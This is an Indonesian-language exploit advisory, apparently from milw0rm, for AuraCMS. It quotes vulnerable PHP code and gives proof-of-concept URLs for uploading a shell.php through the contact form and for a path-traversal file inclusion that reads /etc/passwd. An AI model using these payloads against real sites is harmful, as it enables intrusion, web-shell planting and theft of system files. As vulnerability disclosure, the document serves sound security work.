<html><head><title>AuraCMS 2.1 Remote File Attachment / LFI Vulnerabilities</title></head><pre>########################################################################
# AuraCMS 2.1 - Remote File Attachment - Local File Inclusion
# Vendor           : http://www.auracms.org/
# Download        : http://www.auracms.org/dl_jump.php?id=42
# Ditemukan oleh   : k1tk4t - k1tk4t[4t]newhack.org
# Lokasi           : Indonesia  --  #newhack[dot]org @ irc.dal.net
########################################################################
====================================
Remote File Attachment Vulnerability
====================================

//berkas pada '/mod/contak.php'
---------------- Baris-41 --------------------
if ($_POST['submit']) {


    $nama = text_filter($_POST['nama']);
   
    $email = text_filter($_POST['email']);

    $pesan = nl2br(text_filter($_POST['pesan'], 2));

    $images = text_filter($_POST['image']);



    checkemail($email);

    $gfx_check = intval($_POST['gfx_check']);

        if (!$nama)  $error .= &quot;Error: Please enter your name!&lt;br /&gt;&quot;;

        if (!$pesan) $error .= &quot;Error: Please enter a message!&lt;br /&gt;&quot;;



        $code = substr(hexdec(md5(&quot;&quot;.date(&quot;F j&quot;).&quot;&quot;.$_POST['random_num'].&quot;&quot;.$sitekey.&quot;&quot;)), 2, 6);

    if (extension_loaded(&quot;gd&quot;) AND $code != $_POST['gfx_check']) $error .= &quot;Error: Security Code Invalid&lt;br /&gt;&quot;;



    if ($error) {

        $tengah.='&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; class=&quot;middle&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;table width=&quot;100%&quot; class=&quot;bodyline&quot;&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;img src=&quot;images/warning.gif&quot; border=&quot;0&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;font class=&quot;option&quot;&gt;'.$error.'&lt;/font&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;img src=&quot;images/warning.gif&quot; border=&quot;0&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';

    } else {



    if (!empty ($image_name)){

    $image_name = $_FILES['image']['name'];

    $image_temp = $_FILES['image']['tmp_name'];

    $tempat = &quot;files/&quot;;



    @copy($_FILES[image][tmp_name], &quot;./files/&quot;.$image_name);

    if(@copy($_FILES[image][tmp_name], &quot;./files/&quot;.$image_name)){

        unlink($image);

        $sukses = &quot;Sukses Upload File &quot;.$image_name;

    }else{

        $sukses = &quot;Gagal Upload File &quot;.$image_name;

---------------- Baris-61 --------------------

pemfilteran &quot;$images&quot; tidak sempurna, sehingga pengguna dapat mengupload/attachment file yang tidak diinginkan kedalam direktori /files/.

//POC;

http://localhost/auracms2.1/index.php?pilih=../mod/contak

atau

http://localhost/auracms2.1/index.php?pilih=contak&amp;mod=yes

isi semua konten isian, masukan angka 'security code' dengan benar, &quot;Attachment&quot; --&gt; shell.php ;

http://localhost/auracms2.1/files/shell.php



===================================
Local File Inclusion Vulnerability
===================================

//berkas pada '/index.php' - AuraCMS versi 2.x

--------- baris-24 ----------
if (isset ($_GET['mod'])) $mod = $_GET['mod'] ; else $mod = '';




if(!isset($_GET['pilih'])){

include 'content/normal.php';

}else {




if($mod == &quot;yes&quot; &amp;&amp; file_exists(&quot;mod/$_GET[pilih].php&quot;)){

include &quot;mod/$_GET[pilih].php&quot;;

 } else {



if (eregi('http://', $_GET['pilih']) or !file_exists(&quot;content/$_GET[pilih].php&quot;) or $_GET['pilih'] == 'index'){

$_GET['pilih'] = 'normal';
--------- baris-39 ----------


//berkas pada '/index.php' - AuraCMS versi 1.x

--------- baris-13 ----------
&lt;?
if(!isset($pilih))$pilih='';
switch($pilih){
     case '':
       include &quot;normal.php&quot;;
       break;
     default:
       if($mod == &quot;yes&quot; &amp;&amp; file_exists(&quot;mod/$pilih.php&quot;)){
           
        include &quot;mod/$pilih.php&quot;;
       } else {
           if (eregi('http://', $pilih) or !file_exists(&quot;$pilih.php&quot;)){
               $pilih = 'normal';
           }
               include &quot;$pilih.php&quot;;
       }
       break;
}
?&gt;
--------- baris-33 ----------

need magic_quotes_gpc = off ,
jika magic_quotes_gpc = off maka pengguna dapat memanipulasi $pilih

//POC;

http://localhost/auracms.x.x/index.php?pilih=../../../../../../../etc/passwd%00

########################################################################
Terimakasih untuk;
str0ke, DNX
xoron,iFX,x-ace,nyubi,arioo,selikoer,k1n9k0ng,aldy_BT,adhietslank
dan semua temen2 komunitas security&amp;hacking
-----------------------
-newhack[dot]org|staff-
mR.opt1lc ,fusion,fl3xu5,PusHm0v,Ghoz,bius,iind_id,slackX
-----------------------
all member newhack[dot]org
-----------------------
all member www.echo.or.id
-----------------------
all member www.yogyafree.net
-----------------------
all member www.sekuritionline.net
-----------------------
all member www.kecoak-elektronik.net
-----------------------
semua komunitas hacker&amp;security Indonesia
Cintailah Bahasa Indonesia

# milw0rm.com [2007-09-10]</pre></html>